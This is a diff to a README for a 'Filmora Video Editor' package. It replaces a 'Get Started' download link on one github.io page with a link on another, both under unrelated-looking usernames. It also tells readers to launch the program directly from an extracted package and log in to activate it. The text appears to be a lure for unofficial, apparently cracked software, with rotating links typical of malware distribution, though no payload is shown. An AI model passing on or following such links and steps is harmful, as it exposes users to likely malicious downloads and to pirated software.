@@ -11,7 +11,7 @@ It provides access to advanced editing modules (AI tools, keyframing, color grad
 
 ## Getting Started
 
-[![Get Started](https://img.shields.io/badge/Get%20Started-Filmora-ff6b6b?style=for-the-badge)](https://sharon3349949.github.io/.github/filmora-video-editor)
+[![Get Started](https://img.shields.io/badge/Get%20Started-Filmora-ff6b6b?style=for-the-badge)](https://arielhansenqmoh.github.io/.github/filmora-video-editor)
 
 1. Launch **Filmora Video Editor** directly from the extracted package (no complex installation required).  
 2. Log in via email, QR code, or continue with an existing session to activate your **Filmora Video Editor** workspace.  
